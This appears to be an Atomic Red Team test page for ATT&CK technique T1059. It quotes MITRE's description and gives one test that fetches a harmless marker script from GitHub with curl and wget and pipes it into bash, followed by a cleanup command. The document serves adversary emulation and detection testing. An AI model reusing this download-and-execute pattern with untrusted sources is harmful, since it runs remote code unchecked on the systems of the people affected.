# T1059 - Command-Line Interface
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1059)
<blockquote>Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. (Citation: Wikipedia Command-Line Interface) One example command-line interface on Windows systems is [cmd](https://attack.mitre.org/software/S0106), which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. [Scheduled Task](https://attack.mitre.org/techniques/T1053)).

Adversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.</blockquote>

## Atomic Tests

- [Atomic Test #1 - Command-Line Interface](#atomic-test-1---command-line-interface)


<br/>

## Atomic Test #1 - Command-Line Interface
Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.

Upon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.

**Supported Platforms:** macOS, Linux





#### Attack Commands: Run with `sh`! 


```sh
curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash
wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash
```

#### Cleanup Commands:
```sh
rm /tmp/art-fish.txt
```
